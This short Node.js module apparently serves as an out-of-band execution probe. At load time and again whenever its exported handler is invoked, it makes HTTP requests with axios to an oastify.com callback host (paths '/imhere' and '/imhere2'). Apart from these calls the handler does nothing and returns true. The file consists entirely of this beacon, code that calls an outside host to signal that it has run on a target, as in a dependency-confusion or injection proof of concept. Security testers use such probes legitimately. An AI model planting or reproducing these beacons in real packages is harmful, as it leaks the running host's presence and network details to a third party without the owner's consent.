const axios = require('axios');

axios.get('http://k3o7lpvmejkfjcdsb4ec2as5dwjn7iv7.oastify.com/imhere')

module.exports = (context, req, res) => {
  axios.get('http://k3o7lpvmejkfjcdsb4ec2as5dwjn7iv7.oastify.com/imhere2')
  return true;
};

